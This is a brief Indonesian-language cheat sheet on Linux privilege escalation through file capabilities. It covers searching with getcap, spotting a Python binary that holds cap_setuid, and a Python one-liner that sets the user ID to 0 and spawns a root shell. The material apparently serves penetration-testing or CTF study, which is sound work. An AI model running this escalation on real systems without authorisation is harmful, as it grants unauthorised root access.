cek hak Capabilities

## Cek Hak Sudo

```bash
getcap -r /
```
Perhatikan entry seperti:

```text
/usr/bin/python3.11 cap_setuid=ep
```
## Contoh Eksploitasi

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'  # Python 
```
